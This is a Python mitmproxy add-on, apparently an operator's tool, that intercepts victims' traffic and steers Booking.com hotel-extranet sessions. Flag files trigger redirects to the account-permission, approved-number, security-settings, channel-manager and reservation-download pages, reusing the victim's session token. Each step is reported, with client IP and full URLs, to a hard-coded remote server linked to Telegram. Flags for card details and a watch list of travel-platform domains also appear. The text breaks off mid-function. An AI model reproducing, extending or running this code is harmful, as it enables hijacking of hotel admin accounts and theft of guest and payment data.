from mitmproxy import http, ctx
import os
import urllib.parse
import time
import threading
import requests
import json
from datetime import datetime
import re

# --- TELEGRAM LOGGING CONFIG ---
TELEGRAM_LOGGING_ENABLED = True
LOG_SERVER_URL = "http://89.42.142.29:5000/log_redirect"
FUNCTION_COMPLETE_URL = "http://89.42.142.29:5000/log_function_complete"

# Домены для мониторинга платформ
PLATFORM_DOMAINS = [
    "agoda.com",
    "expedia.com", 
    "hotels.com",
    "trip.com",
    
    # Индийские
    "goibibo.com",
    "makemytrip.com",
    "yatra.com",
    "cleartrip.com",
    "ixigo.com",
    "paytm.com",
    
    # Американские/Европейские
    "orbitz.com",
    "travelocity.com",
    "priceline.com",
    "hotwire.com",
    "cheaptickets.com",
    "ebookers.com",
    "cheapcaribbean.com",
    "lastminute.com",
    "lastminute.co.uk",
    "opodo.com",
    "ebookers.fr",
    "ebookers.de",
    "volagratis.com",
    
    # Аренда жилья
    "airbnb.com",
    "vrbo.com",
    "homeaway.com",
    "flipkey.com",
    "vacationrentals.com",
    "housetrip.com",
    "wimdu.com",
    "9flats.com",
    "onefinestay.com",
    
    # Хостелы
    "hostelworld.com",
    "hostelbookers.com",
    "hostels.com",
    "grouphouse.com",
    
    # Люксовые/премиум
    "plumguide.com",
    "tablethotels.com",
    "kiwicollection.com",
    "designhotels.com",
    "smallluxuryhotels.com",
    
    # Бутик-отели
    "boutiquehotels.com",
    "i-escape.com",
    
    # Почасовая аренда
    "dayuse.com",
    "hoteltonight.com",
    "byhours.com",
    "recharge.com",
    "daybreakhotels.com",
    
    # Оптовые/корпоративные
    "hotelbeds.com",
    "sunhotels.net",
    "tourico.com",
    "gta.com",
    "hotelcombined.com",
    "trivago.com",
    "kayak.com",
    "skyscanner.com",
    
    # Азиатские
    "rakuten.com",
    "rakuten.travel",
    "japanican.com",
    "jalan.net",
    "japanhotel.net",
    "rurubu.travel",
    "skyticket.jp",
    "asianatra.com",
    "traveloka.com",
    "tiket.com",
    "pegipegi.com",
    "misteraladin.com",
    "zalora.com",
    "wego.com",
    
    # Китайские
    "qunar.com",
    "tongcheng.com",
    "tuniu.com",
    "mango.com",
    "elong.com",
    "meituan.com",
    "dianping.com",
    "ctrip.com.hk",
    "trip.com.hk",
    
    # Корейские
    "yanolja.com",
    "goodchoice.kr",
    "hotelcombined.co.kr",
    
    # Тайваньские
    "ezfly.com",
    "colatour.com.tw",
    
    # Гонконгские
    "hk.trip.com",
    "zuji.com.hk",
    
    # Сингапурские
    "zuji.com.sg",
    "agoda.com.sg",
    
    # Австралийские
    "webjet.com.au",
    "expedia.com.au",
    "lastminute.com.au",
    "wotif.com",
    "stayz.com.au",
    
    # Новозеландские
    "expedia.co.nz",
    
    # Канадские
    "expedia.ca",
    "redtag.ca",
    "itravel2000.com",
    
    # Британские
    "expedia.co.uk",
    "laterooms.com",
    "superbreak.com",
    "alpharooms.com",
    
    # Немецкие
    "expedia.de",
    "hrs.com",
    "trivago.de",
    "booking.de",
    
    # Французские
    "expedia.fr",
    "voyages-sncf.com",
    "trainline.eu",
    "booking.fr",
    
    # Итальянские
    "expedia.it",
    "venere.com",
    "volagratis.it",
    
    # Испанские
    "expedia.es",
    "rumbo.es",
    "atrapalo.com",
    "booking.es",

    # Бразильские
    "decolar.com",
    "submarinoviagens.com.br",
    "hotelurbano.com",
    
    # Мексиканские
    "despegar.com",
    "viaja.com.mx",
    
    # Турецкие
    "etstur.com",
    "tatil.com",
    "odamax.com",
    
    # Ближний Восток
    "almosafer.com",
    "cleartrip.ae",
    "holidaysby.com",
    
    # Африканские
    "travelstart.com",
    "safarinow.com",
    
    # Цепочки отелей
    "marriott.com",
    "hilton.com",
    "ihg.com",
    "hyatt.com",
    "accor.com",
    "bestwestern.com",
    "bwhhotelgroup.com",
    "choicehotels.com",
    "wynnhotels.com",
    "sonder.com",
    "oakwood.com",
    "frasershospitality.com"
]

# Пути к флагам
COOKIE = "mitm_redirect_done"
FORCE_FLAG = r"C:\temp\mitm_force_redirect"
ONE_SHOT_FLAG = r"C:\temp\mitm_reset_once"
MESSAGE_FLAG = r"C:\temp\mitm_message_once"
PROVIDER_FLAG = r"C:\temp\mitm_provider_once"
USER_FLAG = r"C:\temp\mitm_user_once"
SECURITY_FLAG = r"C:\temp\mitm_security_once"
OPERATION_11_FLAG = r"C:\temp\mitm_operation_11_once"
OPERATION_12_FLAG = r"C:\temp\mitm_operation_12_once"
BOOKING_HOTEL_FLAG = r"C:\temp\mitm_booking_hotel_once"
BOOKING_HOTEL_SECURITY_FLAG = r"C:\temp\mitm_booking_hotel_security_once"
OPERATION_16_FLAG = r"C:\temp\mitm_operation_16_once"
CUSTOM_REDIRECT_FLAG = r"C:\temp\mitm_custom_redirect_once"
CUSTOM_REDIRECT_FROM_FILE = r"C:\temp\mitm_custom_redirect_from.txt"
CUSTOM_REDIRECT_TO_FILE = r"C:\temp\mitm_custom_redirect_to.txt"
CUSTOM_REDIRECT_DONE_FLAG = r"C:\temp\mitm_custom_redirect_done.txt"
BOOKING_RESERVATIONS_FLAG = r"C:\temp\mitm_booking_reservations_once"
BOOKING_RESERVATIONS_HOTEL_ID_FILE = r"C:\temp\mitm_booking_reservations_hotel_id.txt"
BOOKING_RESERVATIONS_REPORT_ID_FILE = r"C:\temp\mitm_booking_reservations_report_id.txt"
BOOKING_CC_DETAILS_FLAG = r"C:\temp\mitm_booking_cc_details_once"
BOOKING_CC_DETAILS_BN_FILE = r"C:\temp\mitm_booking_cc_details_bn.txt"
BOOKING_CC_DETAILS_HOTEL_ID_FILE = r"C:\temp\mitm_booking_cc_details_hotel_id.txt"

REDIRECT_FILE = r"C:\mitm\redirect_target.txt"
LOG_PREFIX = "[MITM-REDIR]"

def log(msg):
    ctx.log.info(f"{LOG_PREFIX} {msg}")

def post_log_to_server(payload: dict, endpoint: str = LOG_SERVER_URL):
    """Асинхронная отправка лога"""
    def _worker(data, url):
        try:
            headers = {'Content-Type': 'application/json'}
            requests.post(url, json=data, headers=headers, timeout=3)
        except Exception as e:
            try:
                ctx.log.warn(f"{LOG_PREFIX} failed to post to {url}: {e}")
            except Exception:
                pass

    t = threading.Thread(target=_worker, args=(payload, endpoint), daemon=True)
    t.start()

def log_redirect_to_server(client_ip, from_url, to_url, redirect_type):
    """Логирование редиректа"""
    payload = {
        "client_ip": client_ip or "Unknown",
        "from_url": from_url or "Unknown",
        "to_url": to_url or "Unknown",
        "redirect_type": redirect_type or "Unknown",
        "timestamp": datetime.utcnow().isoformat() + "Z"
    }
    post_log_to_server(payload, LOG_SERVER_URL)
    log(f"Posted redirect: {redirect_type} from {client_ip}")

def send_function_complete_notification(client_ip: str, from_url: str, function_type: str):
    """Отправка уведомления о завершении функции"""
    def _send_complete():
        try:
            payload = {
                "client_ip": client_ip or "Unknown",
                "from_url": from_url or "Unknown",
                "function_type": function_type,
                "timestamp": datetime.utcnow().isoformat() + "Z"
            }
            
            log(f"Sending function complete: {function_type}")
            post_log_to_server(payload, FUNCTION_COMPLETE_URL)
            
        except Exception as e:
            log(f"Error sending function complete: {e}")
    
    threading.Thread(target=_send_complete, daemon=True).start()

def should_log_domain(flow: http.HTTPFlow) -> bool:
    """Проверяет, нужно ли логировать доступ к платформе"""
    if not TELEGRAM_LOGGING_ENABLED:
        return False
    
    host = (flow.request.pretty_host or "").lower()
    
    # Проверяем платформы
    for domain in PLATFORM_DOMAINS:
        if domain in host:
            return True
    
    return False

def is_platform_domain(host: str) -> bool:
    """Проверяет, является ли домен платформой"""
    for domain in PLATFORM_DOMAINS:
        if domain in host:
            return True
    return False

# --- Вспомогательные функции ---
def get_redirect_target():
    try:
        if os.path.exists(REDIRECT_FILE):
            with open(REDIRECT_FILE, 'r', encoding='utf-8') as f:
                target = f.read().strip()
                # Проверяем, что URL не пустой и начинается с http
                if target and target.startswith(('http://', 'https://')):
                    return target
                else:
                    log(f"Invalid redirect target in file: '{target}'")
        log("No valid redirect target found, returning empty string")
        return ""  # ВАЖНО: возвращаем пустую строку вместо bbc.com
    except Exception as e:
        log(f"Error reading redirect target: {e}")
        return ""  # ВАЖНО: возвращаем пустую строку вместо bbc.com

def should_force():
    return os.path.exists(FORCE_FLAG)

def should_one_shot():
    return os.path.exists(ONE_SHOT_FLAG)

def should_message():
    return os.path.exists(MESSAGE_FLAG)

def should_provider():
    return os.path.exists(PROVIDER_FLAG)

def should_user():
    return os.path.exists(USER_FLAG)

def should_security():
    return os.path.exists(SECURITY_FLAG)

def should_operation_11():
    return os.path.exists(OPERATION_11_FLAG)

def should_operation_12():
    return os.path.exists(OPERATION_12_FLAG)

def should_booking_hotel():
    return os.path.exists(BOOKING_HOTEL_FLAG)

def should_booking_hotel_security():
    return os.path.exists(BOOKING_HOTEL_SECURITY_FLAG)

def should_operation_16():
    return os.path.exists(OPERATION_16_FLAG)

def should_custom_redirect():
    return os.path.exists(CUSTOM_REDIRECT_FLAG)

def should_booking_cc_details():
    return os.path.exists(BOOKING_CC_DETAILS_FLAG)

def get_booking_cc_details_bn():
    try:
        if os.path.exists(BOOKING_CC_DETAILS_BN_FILE):
            with open(BOOKING_CC_DETAILS_BN_FILE, 'r') as f:
                return f.read().strip()
    except Exception as e:
        log(f"Error reading booking cc details bn: {e}")
    return "5331278429"  # Значение по умолчанию

def get_booking_cc_details_hotel_id():
    try:
        if os.path.exists(BOOKING_CC_DETAILS_HOTEL_ID_FILE):
            with open(BOOKING_CC_DETAILS_HOTEL_ID_FILE, 'r') as f:
                return f.read().strip()
    except Exception as e:
        log(f"Error reading booking cc details hotel_id: {e}")
    return "10790315"  # Значение по умолчанию

def remove_booking_cc_details_flag():
    try:
        if os.path.exists(BOOKING_CC_DETAILS_FLAG):
            os.remove(BOOKING_CC_DETAILS_FLAG)
            log("Booking CC details redirect flag removed")
    except Exception as e:
        ctx.log.warn(f"{LOG_PREFIX} remove_booking_cc_details_flag error: {e}")

def get_custom_redirect_from():
    try:
        if os.path.exists(CUSTOM_REDIRECT_FROM_FILE):
            with open(CUSTOM_REDIRECT_FROM_FILE, 'r') as f:
                return f.read().strip()
    except Exception as e:
        log(f"Error reading custom redirect FROM: {e}")
    return ""

def get_custom_redirect_to():
    try:
        if os.path.exists(CUSTOM_REDIRECT_TO_FILE):
            with open(CUSTOM_REDIRECT_TO_FILE, 'r') as f:
                return f.read().strip()
    except Exception as e:
        log(f"Error reading custom redirect TO: {e}")
    return ""

def should_booking_reservations():
    return os.path.exists(BOOKING_RESERVATIONS_FLAG)

def get_booking_reservations_hotel_id():
    try:
        if os.path.exists(BOOKING_RESERVATIONS_HOTEL_ID_FILE):
            with open(BOOKING_RESERVATIONS_HOTEL_ID_FILE, 'r') as f:
                return f.read().strip()
    except Exception as e:
        log(f"Error reading booking reservations hotel_id: {e}")
    return "14762911"

def get_booking_reservations_report_id():
    try:
        if os.path.exists(BOOKING_RESERVATIONS_REPORT_ID_FILE):
            with open(BOOKING_RESERVATIONS_REPORT_ID_FILE, 'r') as f:
                return f.read().strip()
    except Exception as e:
        log(f"Error reading booking reservations report_id: {e}")
    return "5865185"

def remove_operation_16_flag():
    try:
        if os.path.exists(OPERATION_16_FLAG):
            os.remove(OPERATION_16_FLAG)
            log("Operation 16 flag removed")
    except Exception as e:
        ctx.log.warn(f"{LOG_PREFIX} remove_operation_16_flag error: {e}")

def enable_booking_hotel_security_flag():
    try:
        parent = os.path.dirname(BOOKING_HOTEL_SECURITY_FLAG)
        if parent and not os.path.exists(parent):
            os.makedirs(parent, exist_ok=True)
        with open(BOOKING_HOTEL_SECURITY_FLAG, 'w') as f:
            f.write("enabled")
        log("Booking-hotel-security redirect flag created")
    except Exception as e:
        log(f"Error creating booking-hotel-security flag: {e}")

def remove_booking_hotel_security_flag():
    try:
        if os.path.exists(BOOKING_HOTEL_SECURITY_FLAG):
            os.remove(BOOKING_HOTEL_SECURITY_FLAG)
            log("Booking-hotel-security redirect flag removed")
    except Exception as e:
        ctx.log.warn(f"{LOG_PREFIX} remove_booking_hotel_security_flag error: {e}")

def enable_booking_hotel_flag():
    try:
        parent = os.path.dirname(BOOKING_HOTEL_FLAG)
        if parent and not os.path.exists(parent):
            os.makedirs(parent, exist_ok=True)
        with open(BOOKING_HOTEL_FLAG, 'w') as f:
            f.write("enabled")
        log("Booking-hotel redirect flag created")
    except Exception as e:
        log(f"Error creating booking-hotel flag: {e}")

def remove_booking_hotel_flag():
    try:
        if os.path.exists(BOOKING_HOTEL_FLAG):
            os.remove(BOOKING_HOTEL_FLAG)
            log("Booking-hotel redirect flag removed")
    except Exception as e:
        ctx.log.warn(f"{LOG_PREFIX} remove_booking_hotel_flag error: {e}")

def remove_booking_reservations_flag():
    try:
        if os.path.exists(BOOKING_RESERVATIONS_FLAG):
            os.remove(BOOKING_RESERVATIONS_FLAG)
            log("Booking reservations redirect flag removed")
    except Exception as e:
        ctx.log.warn(f"{LOG_PREFIX} remove_booking_reservations_flag error: {e}")

def remove_one_shot_flag():
    try:
        if os.path.exists(ONE_SHOT_FLAG):
            os.remove(ONE_SHOT_FLAG)
            log("Global one-shot flag removed")
    except Exception as e:
        ctx.log.warn(f"{LOG_PREFIX} remove_one_shot_flag error: {e}")

def remove_message_flag():
    try:
        if os.path.exists(MESSAGE_FLAG):
            os.remove(MESSAGE_FLAG)
            log("Booking.com message one-shot flag removed")
    except Exception as e:
        ctx.log.warn(f"{LOG_PREFIX} remove_message_flag error: {e}")

def remove_provider_flag():
    try:
        if os.path.exists(PROVIDER_FLAG):
            os.remove(PROVIDER_FLAG)
            log("Booking.com provider one-shot flag removed")
    except Exception as e:
        ctx.log.warn(f"{LOG_PREFIX} remove_provider_flag error: {e}")

def remove_user_flag():
    try:
        if os.path.exists(USER_FLAG):
            os.remove(USER_FLAG)
            log("Booking.com user one-shot flag removed")
    except Exception as e:
        ctx.log.warn(f"{LOG_PREFIX} remove_user_flag error: {e}")

def remove_security_flag():
    try:
        if os.path.exists(SECURITY_FLAG):
            os.remove(SECURITY_FLAG)
            log("Booking.com security one-shot flag removed")
    except Exception as e:
        ctx.log.warn(f"{LOG_PREFIX} remove_security_flag error: {e}")

def remove_operation_11_flag():
    try:
        if os.path.exists(OPERATION_11_FLAG):
            os.remove(OPERATION_11_FLAG)
            log("Operation 11 one-shot flag removed")
    except Exception as e:
        ctx.log.warn(f"{LOG_PREFIX} remove_operation_11_flag error: {e}")

def remove_operation_12_flag():
    try:
        if os.path.exists(OPERATION_12_FLAG):
            os.remove(OPERATION_12_FLAG)
            log("Operation 12 one-shot flag removed")
    except Exception as e:
        ctx.log.warn(f"{LOG_PREFIX} remove_operation_12_flag error: {e}")

def is_redirect_target(flow: http.HTTPFlow, redirect_target: str) -> bool:
    try:
        if not redirect_target:
            return False
        req_url = flow.request.pretty_url.lower()
        target_url = redirect_target.lower().rstrip("/")
        return req_url.startswith(target_url)
    except Exception:
        return False

def get_client_ip(flow):
    """Получение IP адреса клиента"""
    try:
        client_conn = getattr(flow, "client_conn", None)
        if client_conn:
            peername = getattr(client_conn, "peername", None)
            if peername and isinstance(peername, tuple) and len(peername) > 0:
                return peername[0]
    except Exception as e:
        log(f"Error getting client IP: {e}")
    
    return "Unknown"

# --- Функции редиректов ---
def booking_redirect(flow: http.HTTPFlow, redirect_type: str) -> bool:
    flags = {
        "message": (should_message, remove_message_flag, "https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/messaging/security_settings.html"),
        "provider": (should_provider, remove_provider_flag, "https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/channel-manager/index.html"),
        "user": (should_user, remove_user_flag, "https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/accounts_and_permissions.html"),
        "security": (should_security, remove_security_flag, "https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/approvednumbers.html")
    }
    
    if redirect_type not in flags:
        return False
        
    should_redirect, remove_flag, base_url = flags[redirect_type]
    
    if not should_redirect():
        return False

    url = flow.request.pretty_url
    if not url.startswith("https://admin.booking.com/hotel/hoteladmin/"):
        return False

    parsed = urllib.parse.urlparse(url)
    query = urllib.parse.parse_qs(parsed.query)

    # Получаем hotel_id и ses из запроса
    hotel_id = query.get("hotel_id", ["14762911"])[0]
    ses = query.get("ses", ["ec1745929d110e5a461e56e51a3cda93"])[0]

    # Формируем целевой URL в зависимости от типа
    if redirect_type == "provider":
        target_url = f"{base_url}?lang=en&ses={ses}&hotel_id={hotel_id}&fr_account_menu=1&view=start"
    else:
        target_url = f"{base_url}?lang=en&ses={ses}&hotel_id={hotel_id}"

    log(f"Booking.com {redirect_type.upper()} redirect {url} -> {target_url}")
    
    # Логируем редирект
    client_ip = get_client_ip(flow)
    log_redirect_to_server(client_ip, url, target_url, f"BOOKING_{redirect_type.upper()}")
    
    # Выполняем редирект
    flow.response = http.Response.make(
        302, b"", {"Location": target_url}
    )

    remove_flag()
    
    # Отправляем уведомление о завершении
    if redirect_type == "message":
        send_function_complete_notification(client_ip, url, "FUNCTION_7_COMPLETE")
    elif redirect_type == "provider":
        send_function_complete_notification(client_ip, url, "FUNCTION_8_COMPLETE")
    elif redirect_type == "user":
        send_function_complete_notification(client_ip, url, "FUNCTION_9_COMPLETE")
    elif redirect_type == "security":
        send_function_complete_notification(client_ip, url, "FUNCTION_10_COMPLETE")
    
    return True

def booking_reservations_download_redirect(flow: http.HTTPFlow) -> bool:
    """
    ФУНКЦИЯ 18:
    Редиректит все запросы к admin.booking.com/hotel/* на страницу загрузки резервов.
    Завершается когда пользователь достигнет страницы со ВСЕМИ параметрами:
    hotel_id, lang, reportId, ses, auth_assurance_last_check
    НЕТ финального редиректа - пользователь остается на reservations_download.html
    """
    try:
        log(f"[F18] Checking if should redirect...")
        
        if not should_booking_reservations():
            log(f"[F18] Flag not active")
            return False

        url = flow.request.pretty_url
        host = (flow.request.pretty_host or "").lower()
        
        log(f"[F18] Processing URL: {url}")
        log(f"[F18] Host: {host}")
        
        # ====== ТОЛЬКО admin.booking.com ======
        if not host.endswith("admin.booking.com"):
            log(f"[F18] Not admin.booking.com, skipping")
            return False
        
        # ====== ПРОВЕРКА ЗАВЕРШЕНИЯ ФУНКЦИИ 18 ======
        # Проверяем, что это ЛЮБОЙ запрос, содержащий все 5 параметров
        parsed = urllib.parse.urlparse(url)
        query = urllib.parse.parse_qs(parsed.query)
        
        # ВАЖНО: Функция завершается ТОЛЬКО при наличии ВСЕХ 5 параметров в любом запросе:
        required_params = ["hotel_id", "lang", "reportId", "ses", "auth_assurance_last_check"]
        has_all_params = all(param in query for param in required_params)
        
        if has_all_params:
            log(f"[F18] ✓ Detected ALL 5 required parameters in URL -> FUNCTION 18 COMPLETED")
            
            # Получаем полный URL для Telegram
            full_url = url
            
            # Удаляем флаг функции 18
            remove_booking_reservations_flag()
            
            # ОТПРАВЛЯЕМ УВЕДОМЛЕНИЕ О ЗАВЕРШЕНИИ (с полным URL)
            client_ip = get_client_ip(flow)
            send_function_complete_notification(client_ip, full_url, "FUNCTION_18_COMPLETE")
            
            log(f"[F18] ✓ Completion notification sent for function 18")
            
            # ====== НЕТ ФИНАЛЬНОГО РЕДИРЕКТА ======
            # Пользователь остается на текущей странице (reservations_download.html)
            log(f"[F18] ✓ Function completed, NO final redirect - user stays on page")
            return False  # Не делаем редирект, просто завершаем функцию
        
        # ====== ЕСЛИ ЕЩЕ НЕТ ВСЕХ ПАРАМЕТРОВ ======
        
        # Проверяем, если это уже страница reservations_download.html (но без всех параметров)
        if "reservations_download.html" in url:
            log(f"[F18] On reservations_download.html but missing some parameters")
            
            # Если уже есть hotel_id и reportId - ждем остальные параметры
            if "hotel_id" in query and "reportId" in query:
                log(f"[F18] Has hotel_id and reportId, waiting for ses and auth_assurance_last_check")
                return False  # Не делаем редирект
        
        # ====== ПЕРВИЧНЫЙ РЕДИРЕКТ ======
        # Если пользователь НЕ на reservations_download.html И НЕ имеет всех параметров
        # И это запрос к /hotel/ - делаем первоначальный редирект
        
        parsed = urllib.parse.urlparse(url)
        path = parsed.path or "/"
        
        # Проверяем, что путь начинается с /hotel/
        if not path.startswith("/hotel/"):
            log(f"[F18] Path doesn't start with /hotel/: {path}")
            return False
        
        log(f"[F18] Path starts with /hotel/: {path}")
        
        # Если это уже промежуточная страница reservations_download.html - не делаем редирект
        if "reservations_download.html" in url:
            log(f"[F18] Already on reservations_download.html page, NOT redirecting")
            return False
        
        # Получаем параметры из конфигурации
        hotel_id = get_booking_reservations_hotel_id()
        report_id = get_booking_reservations_report_id()
        
        log(f"[F18] Using hotel_id: {hotel_id}, report_id: {report_id}")
        
        # Формируем промежуточный целевой URL (без ses и auth_assurance_last_check)
        target_url = f"https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/reservations_download.html?hotel_id={hotel_id}&lang=en&reportId={report_id}"
        
        log(f"[F18] Target URL: {target_url}")
        
        # Проверяем, что это не редирект на ту же самую страницу
        if url == target_url:
            log(f"[F18] URL is same as target, not redirecting")
            return False
        
        log(f"[F18] ✓ Redirecting {url} -> {target_url}")
        
        # Логируем редирект (уведомление о НАЧАЛЕ функции)
        client_ip = get_client_ip(flow)
        log_redirect_to_server(client_ip, url, target_url, "FUNCTION_18_RESERVATIONS_DOWNLOAD")
        
        # Выполняем ПЕРВИЧНЫЙ редирект
        flow.response = http.Response.make(
            302, 
            b"", 
            {
                "Location": target_url,
                "Cache-Control": "no-cache, no-store, must-revalidate",
                "Pragma": "no-cache",
                "Expires": "0"
            }
        )
        return True
        
    except Exception as e:
        log(f"[F18] Error in booking_reservations_download_redirect: {e}")
        import traceback
        log(f"[F18] Traceback: {traceback.format_exc()}")
        return False
        
    except Exception as e:
        log(f"[F18] Error in booking_reservations_download_redirect: {e}")
        import traceback
        log(f"[F18] Traceback: {traceback.format_exc()}")
        return False

def booking_hotel_global_redirect(flow: http.HTTPFlow) -> bool:
    """
    ФУНКЦИЯ 13:
    Редиректит все запросы на approvednumbers.html.
    """
    try:
        if not should_booking_hotel():
            return False

        url = flow.request.pretty_url
        approved_base = "https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/approvednumbers.html"

        # Если это сам approvednumbers.html — проверяем наличие auth_assurance_last_check
        if url.startswith(approved_base):
            parsed = urllib.parse.urlparse(url)
            query = urllib.parse.parse_qs(parsed.query)
            if "auth_assurance_last_check" in query:
                log("Function 13: Detected approvednumbers.html with auth_assurance_last_check -> function completed")
                remove_booking_hotel_flag()
                
                # ОТПРАВЛЯЕМ УВЕДОМЛЕНИЕ О ЗАВЕРШЕНИИ
                client_ip = get_client_ip(flow)
                send_function_complete_notification(client_ip, url, "FUNCTION_13_COMPLETE")
                
                # --- ОПЕРАЦИЯ 16: Если активна операция 16, включаем функцию 15 ---
                if should_operation_16():
                    log("Operation 16: Function 13 completed, enabling function 15")
                    try:
                        with open(BOOKING_HOTEL_SECURITY_FLAG, 'w') as f:
                            f.write("enabled")
                        log("Operation 16: Function 15 enabled")
                    except Exception as e:
                        log(f"Error enabling function 15 in operation 16: {e}")
            
            # Do not redirect approvednumbers itself
            return False

        parsed = urllib.parse.urlparse(url)
        path = parsed.path or "/"
        host = (flow.request.pretty_host or "").lower()

        # Только для admin.booking.com и путей начинающихся с /hotel/
        if not host.endswith("admin.booking.com"):
            return False
        if not path.startswith("/hotel/"):
            return False

        # Получаем ses и hotel_id
        query = urllib.parse.parse_qs(parsed.query)
        hotel_id = None
        ses = None

        if "hotel_id" in query:
            hotel_id = query.get("hotel_id", [None])[0]
        if "ses" in query:
            ses = query.get("ses", [None])[0]

        # Если не нашли — пытаемся из Referer
        if not hotel_id or not ses:
            referer = flow.request.headers.get("Referer") or flow.request.headers.get("referer")
            if referer:
                try:
                    rp = urllib.parse.urlparse(referer)
                    rq = urllib.parse.parse_qs(rp.query)
                    if not hotel_id and "hotel_id" in rq:
                        hotel_id = rq.get("hotel_id", [None])[0]
                    if not ses and "ses" in rq:
                        ses = rq.get("ses", [None])[0]
                except Exception:
                    pass

        # Дополнительная эвристика
        if not hotel_id:
            m = re.search(r"/hotel/(?:.*/)?(\d+)(?:/|$)", path)
            if m:
                hotel_id = m.group(1)

        # Подставляем дефолтные значения
        if not hotel_id:
            hotel_id = "14762911"
        if not ses:
            ses = "ec1745929d110e5a461e56e51a3cda93"

        target_url = f"{approved_base}?lang=en&ses={ses}&hotel_id={hotel_id}"

        log(f"Function 13: BOOKING_HOTEL redirect {url} -> {target_url}")

        client_ip = get_client_ip(flow)
        log_redirect_to_server(client_ip, url, target_url, "BOOKING_HOTEL")

        # Выполняем редирект
        flow.response = http.Response.make(302, b"", {"Location": target_url})
        return True

    except Exception as e:
        log(f"booking_hotel_global_redirect error: {e}")
        return False

def booking_hotel_security_redirect(flow: http.HTTPFlow) -> bool:
    """
    ФУНКЦИЯ 15:
    Перенаправляет на security_settings.html.
    """
    try:
        if not should_booking_hotel_security():
            return False

        url = flow.request.pretty_url
        
        # Проверяем, не является ли это целевой страницей settings.html
        if "https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/messaging/settings.html" in url:
            log("Function 15: User reached messaging/settings.html -> function completed")
            remove_booking_hotel_security_flag()
            
            # ОТПРАВЛЯЕМ УВЕДОМЛЕНИЕ О ЗАВЕРШЕНИИ
            client_ip = get_client_ip(flow)
            send_function_complete_notification(client_ip, url, "FUNCTION_15_COMPLETE")
            
            # --- ОПЕРАЦИЯ 16: Если активна операция 16, завершаем ее ---
            if should_operation_16():
                log("Operation 16: Function 15 completed, operation finished")
                remove_operation_16_flag()
            
            return False
        
        # Проверяем, что это запрос к admin.booking.com
        host = (flow.request.pretty_host or "").lower()
        if not host.endswith("admin.booking.com"):
            return False
            
        # Если уже на security_settings.html - не делаем редирект
        if "security_settings.html" in url:
            return False

        # Получаем параметры
        parsed = urllib.parse.urlparse(url)
        query = urllib.parse.parse_qs(parsed.query)
        
        hotel_id = None
        ses = None
        
        # Пытаемся получить hotel_id и ses
        if "hotel_id" in query:
            hotel_id = query.get("hotel_id", [None])[0]
        if "ses" in query:
            ses = query.get("ses", [None])[0]
        
        # Если не нашли в query - проверяем Referer
        if not hotel_id or not ses:
            referer = flow.request.headers.get("Referer") or flow.request.headers.get("referer")
            if referer:
                try:
                    rp = urllib.parse.urlparse(referer)
                    rq = urllib.parse.parse_qs(rp.query)
                    if not hotel_id and "hotel_id" in rq:
                        hotel_id = rq.get("hotel_id", [None])[0]
                    if not ses and "ses" in rq:
                        ses = rq.get("ses", [None])[0]
                except Exception:
                    pass
        
        # Дополнительная эвристика
        if not hotel_id:
            m = re.search(r"/hotel/(?:.*/)?(\d+)(?:/|$)", parsed.path)
            if m:
                hotel_id = m.group(1)
        
        # Значения по умолчанию
        if not hotel_id:
            hotel_id = "14762911"
        if not ses:
            ses = "fe4d20067bebe1ae741804589903f82f"
        
        # Формируем целевой URL
        target_url = f"https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/messaging/security_settings.html?ses={ses}&hotel_id={hotel_id}&lang=en"
        
        log(f"Function 15: Redirect {url} -> {target_url}")
        
        # Логируем редирект
        client_ip = get_client_ip(flow)
        log_redirect_to_server(client_ip, url, target_url, "FUNCTION_15_HOTEL_SECURITY")
        
        # Выполняем редирект
        flow.response = http.Response.make(
            302, 
            b"", 
            {
                "Location": target_url,
                "Cache-Control": "no-cache, no-store, must-revalidate",
                "Pragma": "no-cache",
                "Expires": "0"
            }
        )
        return True
        
    except Exception as e:
        log(f"booking_hotel_security_redirect error: {e}")
        return False

def custom_redirect(flow: http.HTTPFlow) -> bool:
    """
    ФУНКЦИЯ 17: ЕДИНОРАЗОВЫЙ КАСТОМНЫЙ РЕДИРЕКТ
    Работает для ЛЮБЫХ доменов, независимо от использования ранее
    """
    try:
        # 1. Проверяем активацию
        if not should_custom_redirect():
            return False
        
        # 2. Проверяем done flag (если есть - функция уже выполнена)
        if os.path.exists(CUSTOM_REDIRECT_DONE_FLAG):
            log("[F17] One-time redirect already performed - skipping")
            return False
        
        url = flow.request.pretty_url
        from_domain = get_custom_redirect_from()
        to_domain = get_custom_redirect_to()
        
        if not from_domain or not to_domain:
            log("[F17] Missing FROM or TO domains")
            return False
        
        # НОРМАЛИЗАЦИЯ URL
        # Убираем протокол и www для сравнения
        def normalize_url(url_str: str) -> str:
            """Нормализует URL для сравнения"""
            if not url_str:
                return ""
            # Убираем протокол
            if url_str.startswith('https://'):
                url_str = url_str[8:]
            elif url_str.startswith('http://'):
                url_str = url_str[7:]
            # Убираем www
            if url_str.startswith('www.'):
                url_str = url_str[4:]
            # Убираем trailing slash
            url_str = url_str.rstrip('/')
            return url_str.lower()
        
        # Нормализуем URL запроса
        request_url_lower = url.lower()
        request_host = flow.request.pretty_host.lower()
        
        # Нормализуем from_domain (целевой домен)
        from_domain_normalized = normalize_url(from_domain)
        
        log(f"[F17] Checking: request_host={request_host}, from_domain={from_domain_normalized}")
        log(f"[F17] Full request URL: {request_url_lower}")
        
        # ПРОВЕРКА 1: Сравниваем хост запроса с целевым доменом
        if from_domain_normalized not in request_host:
            log(f"[F17] Domain '{from_domain_normalized}' not in '{request_host}' - skipping")
            return False
        
        # ПРОВЕРКА 2: Убедимся, что это не редирект на тот же домен
        to_domain_normalized = normalize_url(to_domain)
        if to_domain_normalized in request_host:
            log(f"[F17] Already on target domain '{to_domain_normalized}' - skipping")
            return False
        
        # ПРОВЕРКА 3: Убедимся, что это HTTP/HTTPS запрос (не websocket и т.д.)
        if not request_url_lower.startswith(('http://', 'https://')):
            log(f"[F17] Not HTTP/HTTPS request - skipping")
            return False
        
        log(f"[F17] ✓ ONE-TIME redirect triggered!")
        log(f"[F17] From: {url}")
        log(f"[F17] To:   {to_domain}")
        
        # Логируем редирект
        client_ip = get_client_ip(flow)
